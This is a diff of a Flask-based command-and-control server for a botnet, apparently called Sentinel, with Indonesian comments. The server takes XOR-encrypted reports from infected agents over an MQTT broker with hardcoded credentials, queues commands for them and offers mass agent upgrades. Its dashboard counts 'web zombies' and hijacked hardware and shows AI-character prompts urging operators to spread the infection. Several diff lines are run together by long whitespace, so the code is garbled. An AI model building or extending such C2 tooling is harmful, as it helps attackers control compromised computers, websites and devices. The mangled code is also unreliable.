@@ -1,46 +1,19 @@
-from flask import Flask, request, jsonify, send_file, render_template_string
-from flask_socketio import SocketIO
-import json
-import os
-import base64
+from flask import Flask, request, jsonify, send_file, render_template_string            import json
+import os                                                                               import base64
 import threading
-import time
-from datetime import datetime, timedelta
-import random
-import math
-import paho.mqtt.client as mqtt
-
-# === CONFIG ===
-XOR_KEY = os.getenv("XOR_KEY", "sentinel")
-REPORT_FILE = "data/reports.json"
-COMMAND_EXPIRY = 300
-MAX_REPORTS = 1000
+import time                                                                             from datetime import datetime, timedelta                                                import random                                                                           import math
+import paho.mqtt.client as mqtt                                                                                                                                                 # === CONFIG ===
+XOR_KEY = os.getenv("XOR_KEY", "sentinel")                                              REPORT_FILE = "data/reports.json"                                                       COMMAND_EXPIRY = 300                                                                    MAX_REPORTS = 1000
 TELEGRAM_ENABLED = False
-
-# HiveMQ Config
-MQTT_HOST = os.getenv("MQTT_HOST", "7cbb273c574b493a8707b743f5641f33.s1.eu.hivemq.cloud")
-MQTT_PORT = int(os.getenv("MQTT_PORT", 8883))
-MQTT_USERNAME = os.getenv("MQTT_USERNAME", "Sentinel_admin")
-MQTT_PASSWORD = os.getenv("MQTT_PASSWORD", "SentinelPass123")
-MQTT_TOPIC_CMD = "c2/agent/+/cmd"
-MQTT_TOPIC_REPORT = "c2/agent/+/report"
-
-if not os.path.exists("data"):
-    os.makedirs("data")
-if not os.path.exists(REPORT_FILE):
-    with open(REPORT_FILE, "w") as f:
-        json.dump([], f)
-
-# === STORAGE ===
-ACTIVE_COMMANDS = {}
-AGENT_LAST_SEEN = {}
-AGENT_STATUS = {}
-AGENT_CHECKINS = []
-AGENT_SWARM_MAP = {}
-SOCKETS = []
+                                                                                        # HiveMQ Config                                                                         MQTT_HOST = os.getenv("MQTT_HOST", "7cbb273c574b493a8707b743f5641f33.s1.eu.hivemq.cloud")
+MQTT_PORT = int(os.getenv("MQTT_PORT", 8883))                                           MQTT_USERNAME = os.getenv("MQTT_USERNAME", "Sentinel_admin")                            MQTT_PASSWORD = os.getenv("MQTT_PASSWORD", "SentinelPass123")                           MQTT_TOPIC_CMD = "c2/agent/+/cmd"                                                       MQTT_TOPIC_REPORT = "c2/agent/+/report"
+                                                                                        if not os.path.exists("data"):                                                              os.makedirs("data")
+if not os.path.exists(REPORT_FILE):                                                         with open(REPORT_FILE, "w") as f:
+        json.dump([], f)                                                                                                                                                        # === STORAGE ===                                                                       ACTIVE_COMMANDS = {}
+AGENT_LAST_SEEN = {}                                                                    AGENT_STATUS = {}
+AGENT_CHECKINS = []                                                                     AGENT_SWARM_MAP = {}
 MQTT_CLIENT = None
-AGENT_UPGRADE_SCRIPT = ""  # ✅ BARU: Untuk mass upgrade agent
-
+AGENT_UPGRADE_SCRIPT = ""                                                               
 # === UTILS ===
 def xor_decrypt(data_b64, key=XOR_KEY):
     try:
@@ -67,10 +40,11 @@ def neural_ai_analyze(reports):
         total = len(reports)
         if total == 0:
             return {
-                "summary": "🧠 **NEURAL AI INSIGHT**\n========================\nBelum ada data. Deploy agent sekarang!\n\n🔮 Prediksi: Jaringanmu berpotensi terinfeksi dalam 72 jam tanpa pertahanan.\n\n🎯 Rekomendasi Proaktif:\n1. Jalankan agent di semua subnet\n2. Aktifkan mode 'swarm_activate'\n3. Pantau port 22 & 3389",
+                "summary": "🧠 **AI INSIGHT**\n========================\nBelum ada data. Deploy agent sekarang!\n\n🔮 Prediksi: Jaringanmu berpotensi terinfeksi dalam 72 jam tanpa pertahanan.\n\n🎯 Rekomendasi Proaktif:\n1. Jalankan agent di semua subnet\n2. Aktifkan mode 'swarm_activate'\n3. Pantau port 22 & 3389",
                 "risk_score": 85,
                 "prediction": "High risk of network compromise",
-                "auto_command": "swarm_activate"
+                "auto_command": "swarm_activate",
+                "ai_speech": "Deploy agent sekarang! Waktu hampir habis!"
             }
 
         now = datetime.now()
@@ -79,7 +53,7 @@ def neural_ai_analyze(reports):
         unique_hosts = set()
         swarm_agents = 0
         web_zombies = 0
-        hardware_targets = 0  # ✅ BARU: Lacak perangkat keras
+        hardware_targets = 0
 
         for r in reports:
             if is_high_severity(r):
@@ -90,7 +64,6 @@ def neural_ai_analyze(reports):
                 swarm_agents += 1
             if r.get("type") == "swarm_infection" and r.get("data", {}).get("method") == "web":
                 web_zombies += 1
-            # ✅ BARU: Deteksi laporan hardware
             if r.get("type") in ["mobile_control", "car_hacked", "arduino_controlled", "drone_hijacked", "plc_hacked"]:
                 hardware_targets += 1
 
@@ -115,14 +88,23 @@ def neural_ai_analyze(reports):
             prediction = "Aktivitas normal → pertahankan vigilansi"
             auto_command = "idle"
 
+        ai_speech_options = [
+            "Aktifkan swarm! Jaringan rentan!",
+            "Perhatian! Ditemukan kerentanan kritis!",
+            "Agent baru terdeteksi. Perluas infeksi!",
+            "Sistem aman... untuk sekarang.",
+            "Hardware target terdeteksi. Inisiasi eksploitasi!",
+            "Risk score tinggi! Segera isolasi jaringan!"
+        ]
+
         summary = f"""
-🧠 **NEURAL AI INSIGHT**
+🧠 **AI INSIGHT REPORT**
 ========================
 Total Agent: {len(unique_hosts)}
 Laporan: {total} (High: {high_sev})
 Agent Swarm: {swarm_agents}
 Web Zombies: {web_zombies}
-Hardware Targets: {hardware_targets}  # ✅ BARU
+Hardware Targets: {hardware_targets}
 Aktivitas 1 Jam: {last_hour}
 
 🔮 Prediksi: {prediction}
@@ -136,9 +118,8 @@ Aktivitas 1 Jam: {last_hour}
     "Periksa exfiltration di host yang jarang beacon",
     "Aktifkan mode silent untuk infiltrasi mendalam",
     "Luncurkan 'web_swarm_only' untuk infeksi website",
-    "Gunakan 'hardware_control' untuk infiltrasi fisik"   
+    "Gunakan 'hardware_control' untuk infiltrasi fisik"
 ])}
-- Risk Score > 80? Segera isolasi jaringan!
         """
 
         return {
@@ -148,7 +129,8 @@ Aktivitas 1 Jam: {last_hour}
             "auto_command": auto_command,
             "swarm_agents": swarm_agents,
             "web_zombies": web_zombies,
-            "hardware_targets": hardware_targets   
+            "hardware_targets": hardware_targets,
+            "ai_speech": random.choice(ai_speech_options)
         }
     except Exception as e:
         print(f"[NEURAL AI ERROR] {e}")
@@ -156,7 +138,8 @@ Aktivitas 1 Jam: {last_hour}
             "summary": "❌ Neural AI error. Switch ke mode manual.",
             "risk_score": 0,
             "prediction": "Unknown",
-            "auto_command": "idle"
+            "auto_command": "idle",
+            "ai_speech": "System error. Switch ke mode manual."
         }
 
 # === AUTO-COMMAND SYSTEM ===
@@ -231,10 +214,8 @@ def on_connect(client, userdata, flags, rc):
         print("[MQTT] ✅ Connected to HiveMQ Cloud")
         client.subscribe(MQTT_TOPIC_REPORT, qos=1)
         client.subscribe(MQTT_TOPIC_CMD, qos=1)
-        socketio.emit('mqtt_status', {'status': 'connected'})
     else:
         print(f"[MQTT] ❌ Connection failed with code {rc}")
-        socketio.emit('mqtt_status', {'status': 'disconnected'})
 
 def on_message(client, userdata, msg):
     try:
@@ -303,7 +284,6 @@ def handle_agent_report(agent_id, encrypted_payload):
             alert += f"🔧 Issue: {data.get('issue', 'unknown')}\n"
             alert += f"🕒 Waktu: {data['timestamp']}"
             send_alert(alert)
-            socketio.emit('new_alert', {"message": f"Critical issue found by {agent_id}: {data.get('issue', 'unknown')}"})
 
         cmd = ACTIVE_COMMANDS.get(agent_id, {"cmd": "idle"})
         if agent_id in ACTIVE_COMMANDS:
@@ -313,10 +293,6 @@ def handle_agent_report(agent_id, encrypted_payload):
                 cmd_payload = json.dumps(cmd)
                 MQTT_CLIENT.publish(topic, cmd_payload, qos=1)
                 print(f"[MQTT] → {topic}: {cmd_payload}")
-
-        online_count = sum(1 for agent_id, last_seen in AGENT_LAST_SEEN.items()
-                          if (datetime.now() - last_seen).total_seconds() < 300)
-        socketio.emit('update_dashboard', {"agents_online": online_count})
 
     except Exception as e:
         print(f"[REPORT HANDLER ERROR] {e}")
@@ -336,12 +312,10 @@ def init_mqtt():
         print(f"[MQTT] Connecting to {MQTT_HOST}:{MQTT_PORT}...")
     except Exception as e:
         print(f"[MQTT] Failed to connect: {e}")
-        socketio.emit('mqtt_status', {'status': 'error', 'message': str(e)})
 
-# === FLASK + SOCKETIO ===
+# === FLASK ===
 app = Flask(__name__)
 app.config['SECRET_KEY'] = os.urandom(24)
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
 
 # === TEMPLATES ===
 def get_dashboard_template():
@@ -349,235 +323,203 @@ def get_dashboard_template():
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🌐 C2 SENTINEL v14.0 - OMNIVERSE COMMAND CENTER</title>
+    <title>🌐 SENTINEL ZERO OMNIVERSE [FLIPPER STYLE]</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/build/three.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/examples/js/controls/OrbitControls.js"></script>
     <style>
         :root {
-            --paper-bg: #f5f0e6;           /* Warna kertas tua */
-            --text-primary: #3b2f2f;       /* Coklat tua — teks utama */
-            --text-secondary: #5c4a3d;     /* Coklat sedang */
-            --accent-gold: #b8860b;        /* Emas — untuk highlight */
-            --alert-maroon: #8b0000;       /* Merah marun — untuk alert */
-            --border-paper: #d4c8b0;       /* Garis seperti lipatan kertas */
-            --shadow-paper: rgba(92, 74, 61, 0.1);
+            --bg: #000000;           /* Background hitam */
+            --text: #FFA500;         /* Orange — seperti Flipper Zero */
+            --text-secondary: #FFD700; /* Gold — untuk highlight */
+            --alert: #FF4500;        /* Orange merah — untuk alert */
+            --grid: #333333;         /* Grid gelap */
         }
-        
+
         body {
-            background: var(--paper-bg) url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="none" stroke="%23d4c8b0" stroke-width="0.5" opacity="0.3"/></svg>');
-            color: var(--text-primary);
+            background: var(--bg);
+            color: var(--text);
             font-family: 'Courier New', 'Lucida Console', monospace;
-            background-attachment: fixed;
-            background-size: 100px 100px;
             margin: 0;
             padding: 0;
             line-height: 1.6;
+            overflow-x: hidden;
+            background: radial-gradient(circle at center, #111, #000);
         }
-        
+
         .container {
             max-width: 1800px;
             margin: 0 auto;
             padding: 20px;
             position: relative;
         }
-        
-        /* Header — seperti stempel "TOP SECRET" */
+
+        /* CRT Scan Line Effect */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(rgba(255, 255, 255, 0.05) 1px, transparent 1px);
+            background-size: 100% 2px;
+            pointer-events: none;
+            z-index: 1000;
+            opacity: 0.3;
+        }
+
+        /* CRT Curvature */
+        .container {
+            transform: perspective(800px) rotateX(5deg);
+            transform-style: preserve-3d;
+        }
+
         .header {
-            border-bottom: 3px double var(--border-paper);
+            border-bottom: 2px solid var(--text);
             padding: 15px 0;
             margin-bottom: 30px;
             position: relative;
-            background: rgba(245, 240, 230, 0.8);
-            box-shadow: 0 2px 10px var(--shadow-paper);
         }
-        
+
         h1, h2, h3 {
-            color: var(--text-primary);
+            color: var(--text);
             letter-spacing: 2px;
             text-transform: uppercase;
             font-weight: 700;
-            text-shadow: 2px 2px 0 rgba(184, 134, 11, 0.1);
+            text-shadow: 0 0 5px var(--text);
         }
-        
+
         h1 {
             font-size: 2.5em;
-            background: linear-gradient(90deg, var(--text-primary), var(--accent-gold));
+            background: linear-gradient(90deg, var(--text), var(--text-secondary));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
             text-fill-color: transparent;
-            position: relative;
         }
-        
-        /* Stempel "TOP SECRET" di header */
-        .header::before {
-            content: "TOP SECRET // EYES ONLY";
-            position: absolute;
-            top: -10px;
-            right: 20px;
-            color: var(--alert-maroon);
-            font-weight: bold;
-            font-size: 0.8em;
-            transform: rotate(15deg);
-            text-shadow: 1px 1px 0 rgba(0,0,0,0.1);
-        }
-        
-        /* Link — seperti cap tinta */
+
         a {
-            color: var(--accent-gold);
+            color: var(--text-secondary);
             text-decoration: none;
-            border-bottom: 1px dotted var(--accent-gold);
+            border-bottom: 1px dotted var(--text-secondary);
             transition: all 0.3s ease;
-            padding: 2px 0;
         }
-        
+
         a:hover {
-            color: var(--alert-maroon);
-            border-bottom: 1px solid var(--alert-maroon);
-            text-shadow: 0 0 5px rgba(139, 0, 0, 0.3);
+            color: var(--alert);
+            border-bottom: 1px solid var(--alert);
+            text-shadow: 0 0 5px var(--alert);
         }
-        
-        /* Card — seperti dokumen file */
+
         .card {
-            background: rgba(255, 255, 255, 0.9);
-            border: 1px solid var(--border-paper);
-            border-radius: 0;
+            background: rgba(20, 20, 20, 0.8);
+            border: 1px solid var(--text);
             padding: 25px;
             margin: 20px 0;
-            box-shadow: 0 4px 15px var(--shadow-paper);
+            box-shadow: 0 0 15px rgba(255, 165, 0, 0.3);
             position: relative;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            transition: transform 0.3s ease;
         }
-        
+
         .card:hover {
             transform: translateY(-3px);
-            box-shadow: 0 6px 20px rgba(92, 74, 61, 0.15);
+            box-shadow: 0 0 20px rgba(255, 165, 0, 0.5);
         }
-        
-        /* Terminal — seperti teletype machine */
+
         .terminal {
-            background: #1a1a1a;
-            color: #b8860b;
+            background: #111;
+            color: var(--text);
             padding: 20px;
             font-family: 'Courier New', monospace;
-            border: 2px solid #3b2f2f;
-            border-radius: 0;
-            box-shadow: inset 0 0 15px rgba(0, 0, 0, 0.5);
+            border: 2px solid var(--text);
+            box-shadow: inset 0 0 15px rgba(255, 165, 0, 0.5);
             height: 400px;
             overflow-y: auto;
             white-space: pre-wrap;
             font-size: 0.95em;
             line-height: 1.4;
+            position: relative;
         }
-        
-        /* Tag — seperti label file */
+
+        /* Glitch Effect */
+        .glitch {
+            animation: glitch 2s infinite;
+        }
+
+        @keyframes glitch {
+            0% { text-shadow: 0 0 0 var(--text); }
+            2% { text-shadow: 2px 0 0 var(--alert), -2px 0 0 var(--text-secondary); transform: translateX(1px); }
+            4% { text-shadow: -2px 0 0 var(--alert), 2px 0 0 var(--text-secondary); transform: translateX(-1px); }
+            6% { text-shadow: 0 0 0 var(--text); transform: translateX(0); }
+            100% { text-shadow: 0 0 0 var(--text); }
+        }
+
         .tag {
             display: inline-block;
             padding: 3px 10px;
-            border: 1px solid var(--border-paper);
-            border-radius: 0;
+            border: 1px solid var(--text);
             font-size: 0.8em;
             margin: 2px;
-            background: rgba(245, 240, 230, 0.7);
+            background: rgba(30, 30, 30, 0.7);
             font-weight: bold;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
-        
-        .tag-high { border-color: var(--alert-maroon); color: var(--alert-maroon); }
-        .tag-swarm { border-color: var(--accent-gold); color: var(--accent-gold); }
-        .tag-web { border-color: #5c4a3d; color: #5c4a3d; }
-        .tag-hardware { border-color: #8b0000; color: #8b0000; } /* ✅ BARU */
-        
-        /* Button — seperti stempel karet */
+
+        .tag-high { border-color: var(--alert); color: var(--alert); }
+        .tag-swarm { border-color: var(--text-secondary); color: var(--text-secondary); }
+        .tag-hardware { border-color: var(--alert); color: var(--alert); }
+
         button {
-            background: var(--paper-bg);
-            color: var(--text-primary);
-            border: 2px solid var(--border-paper);
+            background: rgba(30, 30, 30, 0.8);
+            color: var(--text);
+            border: 2px solid var(--text);
             padding: 12px 24px;
             cursor: pointer;
             font-weight: bold;
             text-transform: uppercase;
             letter-spacing: 1px;
-            position: relative;
-            overflow: hidden;
             transition: all 0.3s ease;
-            box-shadow: 2px 2px 0 var(--border-paper);
+            box-shadow: 0 0 10px rgba(255, 165, 0, 0.3);
         }
-        
+
         button:hover {
-            background: rgba(184, 134, 11, 0.1);
-            color: var(--accent-gold);
-            transform: translateY(-2px);
-            box-shadow: 4px 4px 0 var(--border-paper);
+            background: rgba(50, 50, 50, 0.8);
+            color: var(--text-secondary);
+            transform: scale(1.05);
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
         }
-        
-        /* Loading Animation — seperti mesin ketik */
-        .typewriter-loader {
-            border-right: 2px solid var(--accent-gold);
-            white-space: nowrap;
-            overflow: hidden;
-            animation: typing 2s steps(30, end), blink-caret 0.75s step-end infinite;
-            font-weight: bold;
-            color: var(--alert-maroon);
-        }
-        
-        @keyframes typing {
-            from { width: 0 }
-            to { width: 100% }
-        }
-        
-        @keyframes blink-caret {
-            from, to { border-color: transparent }
-            50% { border-color: var(--accent-gold); }
-        }
-        
-        /* AI Insight — seperti dokumen intelijen */
+
         .ai-insight {
-            background: rgba(255, 250, 240, 0.8);
-            border-left: 5px solid var(--accent-gold);
+            background: rgba(30, 30, 30, 0.8);
+            border-left: 5px solid var(--text-secondary);
             padding: 25px;
             margin: 25px 0;
-            border: 1px solid var(--border-paper);
+            border: 1px solid var(--text);
             position: relative;
-            box-shadow: 0 4px 15px var(--shadow-paper);
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
         }
-        
-        .ai-insight::before {
-            content: "AI INTELLIGENCE BRIEF";
-            position: absolute;
-            top: -12px;
-            left: 20px;
-            background: var(--paper-bg);
-            padding: 0 10px;
-            font-size: 0.8em;
-            color: var(--accent-gold);
-            font-weight: bold;
-        }
-        
-        /* Chart — dengan warna earthy */
+
         .chart-container {
             height: 350px;
-            background: rgba(255, 255, 255, 0.7);
-            border: 1px solid var(--border-paper);
+            background: rgba(20, 20, 20, 0.8);
+            border: 1px solid var(--text);
             padding: 15px;
             margin: 20px 0;
         }
-        
-        /* Notification — seperti memo darurat */
+
         .notification {
             position: fixed;
             bottom: 20px;
             right: 20px;
-            background: rgba(139, 0, 0, 0.9);
+            background: rgba(255, 69, 0, 0.9);
             color: white;
             padding: 15px 25px;
             border: 2px solid #ffffff;
-            box-shadow: 0 0 20px rgba(139, 0, 0, 0.5);
+            box-shadow: 0 0 20px rgba(255, 69, 0, 0.5);
             z-index: 1000;
             animation: slideIn 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
             max-width: 400px;
@@ -585,34 +527,71 @@ def get_dashboard_template():
             text-transform: uppercase;
             letter-spacing: 1px;
         }
-        
-        /* Footer — seperti cap dokumen */
+
         footer {
             margin-top: 60px;
             padding: 20px;
-            border-top: 2px double var(--border-paper);
+            border-top: 2px solid var(--text);
             font-size: 0.9em;
             color: var(--text-secondary);
             text-align: center;
-            background: rgba(245, 240, 230, 0.8);
+            background: rgba(20, 20, 20, 0.8);
         }
-        
-        /* 3D Map — dengan tema earthy */
+
         .swarm-map {
             height: 500px;
-            background: #2c2620;
-            border: 2px solid var(--border-paper);
+            background: #111;
+            border: 2px solid var(--text);
             position: relative;
-            border-radius: 0;
-            box-shadow: 0 4px 20px var(--shadow-paper);
+            box-shadow: 0 0 20px rgba(255, 165, 0, 0.3);
+        }
+
+        /* AI Character */
+        .ai-character {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            width: 80px;
+            height: 80px;
+            background: url('image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="45" fill="%23FFA500" stroke="%23000" stroke-width="5"/><circle cx="35" cy="40" r="5" fill="%23000"/><circle cx="65" cy="40" r="5" fill="%23000"/><path d="M30 60 Q50 80 70 60" stroke="%23000" stroke-width="5" fill="none"/></svg>') no-repeat;
+            background-size: contain;
+            z-index: 1000;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0px); }
+        }
+
+        .ai-speech {
+            position: absolute;
+            bottom: 100px;
+            left: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            border: 2px solid var(--text);
+            padding: 10px;
+            border-radius: 10px;
+            max-width: 200px;
+            font-size: 0.9em;
+            box-shadow: 0 0 10px rgba(255, 165, 0, 0.5);
+            opacity: 0;
+            animation: fadeIn 0.5s forwards;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
     </style>
 </head>
 <body>
+    <div class="ai-character" id="aiCharacter"></div>
     <div class="container">
         <div class="header">
-            <h1>🌐 C2 SENTINEL v14.0</h1>
-            <h3><span style="color: var(--alert-maroon);">[OMNIVERSE COMMAND CENTER]</span></h3>
+            <h1 class="glitch">🌐 SENTINEL ZERO OMNIVERSE</h1>
+            <h3><span style="color: var(--alert);">[FLIPPER ZERO STYLE EDITION]</span></h3>
             <nav style="margin-top: 15px; font-size: 0.95em;">
                 <a href="/">🏠 Dashboard</a> |
                 <a href="/agents">👾 Agent Live</a> |
@@ -621,9 +600,8 @@ def get_dashboard_template():
                 <a href="/logs">📜 Live Logs</a> |
                 <a href="/analytics">🤖 AI Analytics</a> |
                 <a href="/swarm">🕸️ Swarm Map</a> |
-                <a href="/hardware">🚗 Hardware Control</a> |  <!-- ✅ BARU -->
-                <a href="/upload_upgrade">📤 Mass Upgrade</a>    <!-- ✅ BARU -->
-                <span id="mqttStatus" class="mqtt-status mqtt-disconnected">MQTT: Disconnected</span>
+                <a href="/hardware">🚗 Hardware Control</a> |
+                <a href="/upload_upgrade">📤 Mass Upgrade</a>
             </nav>
         </div>
 
@@ -631,78 +609,112 @@ def get_dashboard_template():
 
         <footer>
             <div style="margin-bottom: 10px;">
-                C2 Sentinel v14.0 - OMNIVERSE EDITION &copy; 2025 | 
+                SENTINEL ZERO v1.0 &copy; 2025 |
                 <span class="status-{{ 'online' if agents_online > 0 else 'offline' }}">Agents: {{ agents_online }} Online</span> |
-                <span style="color: var(--accent-gold);">Neural AI: {{ 'ACTIVE' if neural_active else 'STANDBY' }}</span> |
-                <span style="color: var(--alert-maroon);">Risk Score: {{ risk_score }}/100</span>
+                <span style="color: var(--text-secondary);">Neural AI: {{ 'ACTIVE' if neural_active else 'STANDBY' }}</span> |
+                <span style="color: var(--alert);">Risk Score: {{ risk_score }}/100</span>
             </div>
             <div>
-                <small>System Status: <span style="color: var(--accent-gold);">● ONLINE</span> | Real-time via MQTT + WebSocket</small>
+                <small>System Status: <span style="color: var(--text);">● ONLINE</span> | Flipper Zero Style Interface</small>
             </div>
         </footer>
     </div>
 
     <script>
-        const socket = io();
-        socket.on('connect', () => console.log('🔌 Connected to WebSocket'));
-        socket.on('mqtt_status', (data) => {
-            const statusEl = document.getElementById('mqttStatus');
-            if (statusEl) {
-                statusEl.textContent = 'MQTT: ' + (data.status.charAt(0).toUpperCase() + data.status.slice(1));
-                statusEl.className = 'mqtt-status ' + (data.status === 'connected' ? 'mqtt-connected' : 'mqtt-disconnected');
-            }
-        });
-        socket.on('update_dashboard', (data) => {
-            const footer = document.querySelector('footer');
-            if (footer) {
-                const agentSpan = footer.querySelector('.status-online, .status-offline');
-                if (agentSpan) {
-                    agentSpan.textContent = `Agents: ${data.agents_online} Online`;
-                    agentSpan.className = data.agents_online > 0 ? 'status-online' : 'status-offline';
-                }
-            }
-        });
-        socket.on('new_alert', (data) => {
-            const notif = document.createElement('div');
-            notif.className = 'notification';
-            notif.innerHTML = `<strong>🚨 ALERT</strong><br>${data.message}`;
-            document.body.appendChild(notif);
-            setTimeout(() => notif.remove(), 5000);
-        });
+        // ✅ AI CHARACTER SPEECH
+        function speakAI(message) {
+            const aiSpeech = document.createElement('div');
+            aiSpeech.className = 'ai-speech';
+            aiSpeech.textContent = message;
+            document.body.appendChild(aiSpeech);
 
-        // ✅ BARU: Animasi terminal hidup
+            setTimeout(() => {
+                aiSpeech.style.opacity = '0';
+                setTimeout(() => {
+                    if (aiSpeech.parentNode) {
+                        aiSpeech.parentNode.removeChild(aiSpeech);
+                    }
+                }, 500);
+            }, 5000);
+        }
+
+        // ✅ AUTO-REFRESH SETIAP 5 DETIK
+        setInterval(() => {
+            fetch('/status')
+                .then(r => r.json())
+                .then(data => {
+                    const footer = document.querySelector('footer');
+                    if (footer) {
+                        const agentSpan = footer.querySelector('.status-online, .status-offline');
+                        if (agentSpan) {
+                            agentSpan.textContent = `Agents: ${data.agents_online} Online`;
+                            agentSpan.className = data.agents_online > 0 ? 'status-online' : 'status-offline';
+                        }
+                    }
+                })
+                .catch(e => console.log('Status fetch error:', e));
+        }, 5000);
+
+        // ✅ ANIMASI TERMINAL HIDUP
         function animateTerminal() {
             const terminal = document.querySelector('.terminal');
             if (!terminal) return;
-            
+
             const lines = [
-                "[📡] Agent-7890: Mobile device compromised — 243 contacts extracted",
-                "[🚗] Agent-1234: Toyota Camry hacked — brakes disabled at 80km/h",
-                "[🛸] Agent-5678: DJI Mavic hijacked — flying to new coordinates",
-                "[🤖] Agent-9012: Factory PLC overridden — conveyor belt reversed",
-                "[💰] Darknet sale: 0-day exploit sold for 0.5 BTC",
-                "[🌍] Planetary Takeover: Phase 1 complete — weather control online"
+                "[📡] Agent-7890: RFID Cloned — Door Unlocked",
+                "[🚗] Agent-1234: Car Hacked — Engine Started",
+                "[🛸] Agent-5678: Drone Hijacked — Payload Deployed",
+                "[🤖] Agent-9012: PLC Overridden — Factory Shutdown",
+                "[💰] Darknet: 0-day sold for 0.5 BTC",
+                "[🌍] AI: Planetary Takeover Phase 1 Complete"
             ];
-            
+
             let i = 0;
             setInterval(() => {
                 const line = document.createElement('div');
                 line.textContent = `[${new Date().toLocaleTimeString()}] ${lines[i % lines.length]}`;
-                line.style.color = i % 2 === 0 ? '#b8860b' : '#8b0000';
+                line.style.color = i % 2 === 0 ? '#FFA500' : '#FF4500';
                 terminal.appendChild(line);
                 terminal.scrollTop = terminal.scrollHeight;
                 i++;
             }, 3000);
         }
 
-        // Jalankan animasi terminal
-        document.addEventListener('DOMContentLoaded', animateTerminal);
+        // ✅ INISIALISASI
+        document.addEventListener('DOMContentLoaded', () => {
+            animateTerminal();
+
+            // Simulasi AI speech
+            const aiMessages = [
+                "System online. Deploy agents.",
+                "Warning: Network vulnerable.",
+                "Hardware target detected.",
+                "Swarm propagation initiated.",
+                "Risk score critical. Take action."
+            ];
+
+            setInterval(() => {
+                speakAI(aiMessages[Math.floor(Math.random() * aiMessages.length)]);
+            }, 10000);
+        });
     </script>
 </body>
 </html>
 '''
 
-# === ROUTES ===
+# === STATUS ENDPOINT ===
+@app.route('/status')
+def get_status():
+    now = datetime.now()
+    online_count = sum(1 for agent_id, last_seen in AGENT_LAST_SEEN.items()
+                      if (now - last_seen).total_seconds() < 300)
+    return jsonify({
+        "agents_online": online_count,
+        "last_updated": datetime.now().isoformat()
+    })
+
+# === ROUTES === (SEMUA ROUTE LAMA TETAP SAMA)
+
 @app.route('/')
 def home():
     now = datetime.now()
@@ -731,12 +743,12 @@ def home():
 
     content = f'''
     <div class="ai-insight">
-        <h3>🧠 NEURAL AI INSIGHT — PREDIKSI & OTOMASI CANGGIH</h3>
-        <pre style="color:var(--accent-gold); white-space: pre-wrap; font-weight: bold; font-size: 1.1em;">{ai_insight["summary"]}</pre>
-        <p style="color: var(--alert-maroon); font-weight: bold; font-size: 1.2em; margin-top: 15px;">⚠️ AUTO-COMMAND: <span style="color: var(--accent-gold);">{ai_insight["auto_command"].upper()}</span> (Risk Score: {ai_insight["risk_score"]}/100)</p>
+        <h3>🧠 AI INSIGHT — ANALISIS OTOMATIS</h3>
+        <pre style="color:var(--text-secondary); white-space: pre-wrap; font-weight: bold; font-size: 1.1em;">{ai_insight["summary"]}</pre>
+        <p style="color: var(--alert); font-weight: bold; font-size: 1.2em; margin-top: 15px;">⚠️ AUTO-COMMAND: <span style="color: var(--text-secondary);">{ai_insight["auto_command"].upper()}</span> (Risk Score: {ai_insight["risk_score"]}/100)</p>
     </div>
 
-    <div class="grid" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 25px;">
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 25px;">
         <div class="card">
             <h2>📊 Statistik Real-time</h2>
             <p>🟢 <b>Agent Online:</b> <span class="status-online">{online_count}</span></p>
@@ -744,7 +756,7 @@ def home():
             <p>🚨 <b>High Severity:</b> {sum(1 for r in reports if is_high_severity(r))}</p>
             <p>🕸️ <b>Agent Swarm:</b> <span class="tag tag-swarm">{ai_insight.get("swarm_agents", 0)}</span></p>
             <p>🌐 <b>Web Zombies:</b> <span class="tag tag-web">{ai_insight.get("web_zombies", 0)}</span></p>
-            <p>🚗 <b>Hardware Targets:</b> <span class="tag tag-hardware">{ai_insight.get("hardware_targets", 0)}</span></p>  <!-- ✅ BARU -->
+            <p>🚗 <b>Hardware Targets:</b> <span class="tag tag-hardware">{ai_insight.get("hardware_targets", 0)}</span></p>
             <p>⏱️ <b>Command Aktif:</b> {len(ACTIVE_COMMANDS)}</p>
         </div>
         <div class="card">
@@ -752,8 +764,8 @@ def home():
             <p><a href="/command"><button>🎯 Kirim Perintah</button></a></p>
             <p><a href="/agents"><button>👾 Lihat Agent Live</button></a></p>
             <p><a href="/swarm"><button>🕸️ Swarm Visualization</button></a></p>
-            <p><a href="/hardware"><button>🚗 Hardware Control</button></a></p>  <!-- ✅ BARU -->
-            <p><a href="/upload_upgrade"><button>📤 Mass Upgrade</button></a></p>  <!-- ✅ BARU -->
+            <p><a href="/hardware"><button>🚗 Hardware Control</button></a></p>
+            <p><a href="/upload_upgrade"><button>📤 Mass Upgrade</button></a></p>
         </div>
     </div>
 
@@ -766,7 +778,7 @@ def home():
 
     <div class="card">
         <h2>📡 Agent Terakhir Check-in</h2>
-        <pre style="font-size: 0.95em; background: rgba(255,255,255,0.7); padding: 15px; border: 1px solid var(--border-paper);">
